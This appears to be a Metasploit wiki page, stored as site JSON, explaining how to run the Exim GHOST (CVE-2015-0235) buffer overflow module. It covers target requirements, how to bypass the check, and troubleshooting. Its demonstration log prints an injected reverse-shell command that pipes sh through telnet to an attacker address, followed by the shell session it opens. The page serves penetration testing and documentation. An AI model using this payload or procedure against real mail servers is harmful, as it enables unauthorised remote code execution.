{"componentChunkName":"component---src-templates-wiki-template-tsx","path":"/wiki/Resources/How-to-use-exim_gethostbyname_bof.rb-(Exim-GHOST-Buffer-Overflow)","result":{"data":{"markdownRemark":{"id":"290a6002-88df-5a29-a802-6a25046e41d9","frontmatter":{"title":"How to use exim_gethostbyname_bof.rb (Exim GHOST Buffer Overflow)","root":null},"html":"<p>The Exim GHOST buffer overflow is a vulnerability found by researchers from Qualys. On March 17th 2015, Qualys released an exploit module demonstrating the exploitability of this flaw, which is now exim<em>gethostbyname</em>bof.rb in Metasploit Framework.</p>\n<p>When Qualys released the exploit, it included a lot of technical details for debugging and usage purposes. We decided to put all that here in a more readable format.</p>\n<h2 id=\"what-is-ghost\" style=\"position:relative;\"><a href=\"#what-is-ghost\" aria-label=\"what is ghost permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>What is \"GHOST\"</h2>\n<p>This is a heap based buffer overflow found in GNU C Library's <strong>g</strong>et<strong>host</strong>byname functions since glibc-2.2 (November 10, 2000), which is part of the Linux operating system, such as: Debian, Red Hat, CentOS, and Ubuntu.</p>\n<h2 id=\"exploitable-requirements\" style=\"position:relative;\"><a href=\"#exploitable-requirements\" aria-label=\"exploitable requirements permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploitable Requirements</h2>\n<p><strong>On the server-side (victim):</strong></p>\n<ul>\n<li>glibc-2.6 - glibc-2.17: The exploit depends on the newer versions' fd<em>nextsize (a member of the malloc</em>chunk structure) to remotely obtain the address of Exim's smtp<em>cmd</em>buffer in the heap.</li>\n<li>Exim server. The first exploitable version is Exim-4.77, maybe older. The exploit depends on the newer versions' 16-KB smtp<em>cmd</em>buffer to reliably set up the heap as described in the advisory.</li>\n<li>The Exim server also must enable helo<em>try</em>verify<em>hosts or helo</em>verify_hosts in the /etc/exim4/exim4.conf.template file. The \"verify = helo\" ACL might be exploitable too, but the attack vector isn't as reliable, therefore not supported by the module.</li>\n</ul>\n<p>For testing purposes, if you need to find a vulnerable system, you can try Debian 7 (it should come with an exploitable Exim server):\n<a href=\"http://ftp.cae.tntech.edu/debian-cd/dvd/debian-7.7.0-i386-DVD-1.iso\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://ftp.cae.tntech.edu/debian-cd/dvd/debian-7.7.0-i386-DVD-1.iso</a></p>\n<p><strong>On the attacker's side:</strong></p>\n<ul>\n<li>The attacker's IPv4 address must have both forward and reverse DNS entries that match each other (Forward-Confirmed reverse DNS).</li>\n</ul>\n<h2 id=\"the-check-method\" style=\"position:relative;\"><a href=\"#the-check-method\" aria-label=\"the check method permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>The check method</h2>\n<p>The GHOST exploit module comes with a check method. It is explicit, which means the check will actually try to trigger the vulnerability to determine if the host is vulnerable or not.</p>\n<p>The check is also enforced when you use the \"exploit\" or \"run\" command. However, you can turn off the enforcement by setting the <code class=\"language-text\">FORCE_EXPLOIT</code> datastore option to true. For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">set FORCE_EXPLOIT true\nrun</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<h2 id=\"troubleshooting\" style=\"position:relative;\"><a href=\"#troubleshooting\" aria-label=\"troubleshooting permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Troubleshooting</h2>\n<p>If the exim<em>gethostbyname</em>bof.rb module has failed on you:</p>\n<table>\n<thead>\n<tr>\n<th>Failure</th>\n<th>Explanation</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>bad SENDER<em>HOST</em>ADDRESS (nil)</td>\n<td>The SENDER<em>HOST</em>ADDRESS datastore option was not specified</td>\n</tr>\n<tr>\n<td>bad SENDER<em>HOST</em>ADDRESS (not in IPv4 dotted-decimal notation)</td>\n<td>The SENDER<em>HOST</em>ADDRESS datastore option was specified, but not in IPv4 dotted-decimal notation</td>\n</tr>\n<tr>\n<td>bad SENDER<em>HOST</em>ADDRESS (helo<em>verify</em>hosts)</td>\n<td>The SENDER<em>HOST</em>ADDRESS datastore option does not match the IPv4 address of the SMTP client (Metasploit), as seen by the SMTP server (Exim).</td>\n</tr>\n<tr>\n<td>bad SENDER<em>HOST</em>ADDRESS (no FCrDNS)</td>\n<td>the IPv4 address of the SMTP client (Metasploit) has no Forward-Confirmed reverse DNS.</td>\n</tr>\n<tr>\n<td>not vuln? old glibc? (no leaked_arch)</td>\n<td>the remote Exim server is either not vulnerable, or not exploitable (glibc versions older than glibc-2.6 have no fd<em>nextsize member in their malloc</em>chunk structure).</td>\n</tr>\n<tr>\n<td>NUL, CR, LF in addr? (no leaked_addr)</td>\n<td>Exim's heap address contains bad characters (NUL, CR, LF) and was therefore mangled during the information leak; this exploit is able to reconstruct most of these addresses, but not all (worst-case probability is ~1/85, but could be further improved).</td>\n</tr>\n<tr>\n<td>Brute-force SUCCESS\" followed by a nil reply, but no shell</td>\n<td>the remote Unix command was executed, but spawned a bind-shell or a reverse-shell that failed to connect (maybe because of a firewall, or a NAT, etc).</td>\n</tr>\n<tr>\n<td>Brute-force SUCCESS\" followed by a non-nil reply, and no shell</td>\n<td>The remote Unix command was executed, but failed to spawn the shell (maybe because the setsid command doesn't exist, or awk isn't gawk, or netcat doesn't support the -6 or -e option, or telnet doesn't support the -z option, etc).</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"module-demonstration\" style=\"position:relative;\"><a href=\"#module-demonstration\" aria-label=\"module demonstration permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Module Demonstration</h2>\n<p>When everything is dialed in correctly, a successful attack should look like the following:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(exim_gethostbyname_bof) &gt; run\n\n[*] Started reverse double handler\n[*] Trying information leak...\n[!] {:heap_shift=&gt;736}\n[!] {:write_offset=&gt;128, :error=&gt;&quot;503 sender not yet given&quot;}\n[!] {:write_offset=&gt;136, :error=&gt;&quot;\\xE0.\\xFF\\xB7\\xE0.\\xFF\\xB7er not yet given&quot;}\n[!] {:error=&gt;[&quot;\\xE0.\\xFF\\xB7\\xE0.\\xFF\\xB7er not yet given&quot;, &quot;&quot;, &quot;503 \\x89\\x10&quot;, &quot;177&quot;, &quot;177\\\\177\\\\177&quot;, &quot;vJN\\\\177\\\\177\\\\177\\\\177&quot;]}\n[!] {:leaked_arch=&gt;&quot;x86&quot;}\n[!] {:count=&gt;{&quot;\\xE0.\\xFF\\xB7\\xE0.\\xFF\\xB7er not yet given&quot;=&gt;8, &quot;hF\\xFE\\xB7hF\\xFE\\xB7er not yet given&quot;=&gt;2}}\n[+] Successfully leaked_arch: x86\n[+] Successfully leaked_addr: b7fda760\n[*] Trying code execution...\n[!] ${run{/usr/bin/env setsid /bin/sh -c &quot;sh -c &#39;(sleep 4011|telnet 192.168.1.64 4444|while : ; do sh &amp;&amp; break; done 2&gt;&amp;1|telnet 192.168.1.64 4444 &gt;/dev/null 2&gt;&amp;1 &amp;)&#39;&quot;}}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fda760&quot;, :offset=&gt;21}\n[!] {:reply=&gt;{:code=&gt;&quot;250&quot;, :lines=&gt;[&quot;250 Accepted\\r\\n&quot;]}}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fda760&quot;, :offset=&gt;25}\n[!] {:reply=&gt;{:code=&gt;&quot;250&quot;, :lines=&gt;[&quot;250 Accepted\\r\\n&quot;]}}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd8fd7&quot;, :offset=&gt;20}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd8fd7&quot;, :offset=&gt;8}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd784e&quot;, :offset=&gt;6}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd784e&quot;, :offset=&gt;12}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd60c5&quot;, :offset=&gt;19}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd60c5&quot;, :offset=&gt;29}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd493c&quot;, :offset=&gt;23}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd493c&quot;, :offset=&gt;18}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd31b3&quot;, :offset=&gt;14}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd31b3&quot;, :offset=&gt;3}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd1a2a&quot;, :offset=&gt;29}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd1a2a&quot;, :offset=&gt;28}\n[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;&quot;b7fd02a1&quot;, :offset=&gt;26}\n[!] {:reply=&gt;{:code=&gt;&quot;550&quot;, :lines=&gt;[&quot;550 sikVtqGxFOjCBOWTbDupmIuJRmLmShFNqqUYRRPUolyxPmmgLCenEzConuVGWafjgycyRfXulGNwmAOvkqZkGobMyUIMPojZsaziCjVVyvabOrcieEWrLZSgnCCXHeXjIzGGfUALAIubgBEmsKsSWSGa\\r\\n&quot;]}}\n[+] Brute-force SUCCESS\n[+] Please wait for reply...\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo qaNpBmRBEus9XoVZ;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket A\n[*] A: &quot;qaNpBmRBEus9XoVZ\\r\\n&quot;\n[*] Matching...\n[*] B is input...\n[*] Command shell session 1 opened (192.168.1.64:4444 -&gt; 192.168.1.166:58859) at 2015-03-19 03:36:52 -0500\n[!] {:reply=&gt;nil}\n\nid\nuid=104(Debian-exim) gid=112(Debian-exim) groups=112(Debian-exim)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"references\" style=\"position:relative;\"><a href=\"#references\" aria-label=\"references permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>References:</h2>\n<ul>\n<li><a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0235\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0235</a></li>\n<li><a href=\"https://community.qualys.com/blogs/laws-of-vulnerabilities/2015/03/17/ghost-remote-code-execution-exploit\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://community.qualys.com/blogs/laws-of-vulnerabilities/2015/03/17/ghost-remote-code-execution-exploit</a></li>\n<li><a href=\"https://www.qualys.com/research/security-advisories/GHOST-CVE-2015-0235.txt?_ga=1.171218720.101498705.1426692159\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.qualys.com/research/security-advisories/GHOST-CVE-2015-0235.txt?_ga=1.171218720.101498705.1426692159</a></li>\n<li><a href=\"https://www.qualys.com/research/security-advisories/GHOST-CVE-2015-0235.txt?_ga=1.136230833.101498705.1426692159\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.qualys.com/research/security-advisories/GHOST-CVE-2015-0235.txt?_ga=1.136230833.101498705.1426692159</a></li>\n</ul>"}},"pageContext":{"id":"290a6002-88df-5a29-a802-6a25046e41d9"}}}